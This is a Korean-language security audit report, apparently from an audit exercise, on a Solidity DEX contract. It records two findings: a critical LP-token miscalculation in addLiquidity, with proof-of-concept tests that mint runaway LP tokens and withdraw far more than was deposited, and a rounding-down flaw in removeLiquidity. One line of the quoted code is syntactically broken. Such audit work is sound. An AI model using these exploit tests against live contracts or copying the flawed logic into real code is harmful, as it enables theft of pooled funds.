# 이성휘

## lptoken 계산 실수
#### Dex.sol:addLiquidity:124-142
**********************critical (파급력: high, 공격 난이도: medium)**********************

```solidity
function addLiquidity(
        uint256 tokenXAmount,
        uint256 tokenYAmount,
        uint256 minimumLPTokenAmount
    ) external returns (uint256 LPTokenAmount) {
        require(tokenXAmount > 0 && tokenYAmount > 0);
        // reservedX, reservedY애 tokenXAmount, tokenYAmount 추가
        // curX, curY는 결과적으로 제공한 tokenXAmount, tokenYAmount인듯.
        setReserve(tokenXAmount, tokenYAmount);
        uint256 liquidity;
        // X_*Y/X => setResreve에서 X = (X + X_), Y = (Y + Y_) 
        uint256 optToken = quote(curX, reservedX, reservedY);
        // 기존 비율보다 X_가 더 많이 들어옴
        if (optToken > curY) {
            // X*Y_/Y
            optToken = quote(curY, reservedY, reservedX);
            // 비율이 올바른지 화ㅏㄱ인
            require(optToken == curX, "XXXXXX");
            tokenX.transferFrom(msg.sender, address(this), optToken);
            tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
            liquidity = sqrt(optToken * tokenYAmount);
        } else {
            // X_가 기존보다 너무 작을경우 optToken이 0이 되기 때문에 revert
            require(optToken == curY);
            tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
            tokenY.transferFrom(msg.sender, address(this), optToken);
            liquidity = sqrt(optToken * tokenXAmount);
        }
        // Y가 더많이 들어왔을경우 X의 reserve에는 optToken만큼만 넣는다.
        if (optToken > curY) {
            // lp토큰을 처음 발행
            if (sqrt((reservedX * reservedY) / (curX * curY)) == 1) {
                reward = liquidity;
            } else {
                reward =
                    (sqrt((reservedX * reservedY) / (curX * curY)) - 1) *
                    reward;
            }
            setReserve(optToken, tokenYAmount);
        } else {
            if (sqrt((reservedX * reservedY) / (curX * curY)) == 1) {
                reward = liquidity;
            } else {
                reward =
                    (sqrt((reservedX * reservedY) / (curX * curY)) - 1) *
                     ;
            }
            setReserve(tokenXAmount, optToken);
        }

        preX = tokenX.balanceOf(address(this));
        preY = tokenY.balanceOf(address(this));

        if (minimumLPTokenAmount > reward) revert();
        rewards[msg.sender] += reward;
        totalReward += reward;
        return reward;
    }
```

reward(LP token)를 발행할때 처음 이후로는 (root{(X+X_)*(Y+Y_)/(X_*Y_)} - 1)*reward로  reward를 계산한다.

이 때 reward값은 이전에 전달한 reward값이다.

그러므로 이전에 전달한 값이 크다면 다음번 addliquidity에서 얻는 lp token의 값도 커지게 된다.

#### PoC

```solidity
function testAddLiquidity() external {
        uint lp1 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        uint lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        uint lp3 = dex.addLiquidity(100 ether, 100 ether, 0);
        console.log("LP1: %d", lp1);
        console.log("LP2: %d", lp2);
        console.log("LP3: %d", lp3);

        (uint rx, uint ry) = dex.removeLiquidity(lp3, 0, 0);
        console.log("EX: %d", 100 ether);
        console.log("rx: %d", rx);
        console.log("EY: %d", 100 ether);
        console.log("ry: %d", ry);
    }
function testAddLiquidity2() external {
        uint lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
        lp = dex.addLiquidity(1 ether, 1 ether, 0);
        console.log("LP1: %d", lp);
    }
```

```solidity
[PASS] testAddLiquidity() (gas: 554248)
Logs:
  LP1: 1000000000000000000000
  LP2: 1000000000000000000000
  LP3: 20000000000000000000000
  EX: 100000000000000000000
  rx: 1909090909090909000000
  EY: 100000000000000000000
  ry: 1909090909090909000000

[PASS] testAddLiquidity2() (gas: 1746476)
Logs:
  LP1: 1000000000000000000
  LP1: 1000000000000000000
  LP1: 2000000000000000000
  LP1: 6000000000000000000
  LP1: 24000000000000000000
  LP1: 120000000000000000000
  LP1: 720000000000000000000
  LP1: 5040000000000000000000
  LP1: 40320000000000000000000
  LP1: 362880000000000000000000
  LP1: 3628800000000000000000000
  LP1: 39916800000000000000000000
  LP1: 479001600000000000000000000
  LP1: 6227020800000000000000000000
  LP1: 87178291200000000000000000000
  LP1: 1307674368000000000000000000000
  LP1: 20922789888000000000000000000000
  LP1: 355687428096000000000000000000000
  LP1: 6402373705728000000000000000000000
```

## RemoveLiquidity Round Down
#### Dex.sol:removeLiquidity:172-173
****************low (파급력: low, 공격 난이도: low)****************

```solidity
function removeLiquidity(
        uint256 LPTokenAmount,
        uint256 minimumTokenXAmount,
        uint256 minimumTokenYAmount
    ) external returns (uint256 _tx, uint256 _ty) {
        require(LPTokenAmount != 0);
        require(rewards[msg.sender] >= LPTokenAmount);
        rewards[msg.sender] -= LPTokenAmount;

        uint256 n = 10 ** 5;
        uint256 users = (totalReward * n) / LPTokenAmount;

        if (users % 10 != 0) {
            users = totalReward / LPTokenAmount;
            n = 1;
        }

        totalReward -= LPTokenAmount;
        setReserve();
        uint256 amountX = (reservedX / users) * n;
        uint256 amountY = (reservedY / users) * n;
        require(
            minimumTokenXAmount <= amountX && minimumTokenYAmount <= amountY
        );

        reservedX -= amountX;
        reservedY -= amountY;
        setReserve();

        return (amountX, amountY);
    }
```

total supply의 단위를 올려서 LPTokenAmount랑 나눈값을 users에 저장한다.

그리고 DEX의 리저브를 users로 나눠서 지분에 따라서 분배하게 된다. userus는 단위가 올라가 있기 때문에 reservedX / users에서 round down이 생기게 된다.

#### PoC

```solidity
function testRoundDownRemovLiquidity() external {
        uint lp = dex.addLiquidity(972 ether, 972 ether, 0);
        console.log("LP1: %d", lp);
        (uint rx, uint ry) = dex.removeLiquidity(lp/17, 0, 0);
        console.log("EX: %d", uint(972 ether) / 17);
        console.log("rx: %d", rx);
        console.log("ry: %d", ry);
    }
```

```solidity
[PASS] testRoundDownRemovLiquidity() (gas: 389877)
Logs:
  LP1: 972000000000000000000
  reservedX: 972000000000000000000
  users: 1700000
  EX: 57176470588235294117
  rx: 57176470588235200000
  ry: 57176470588235200000
```
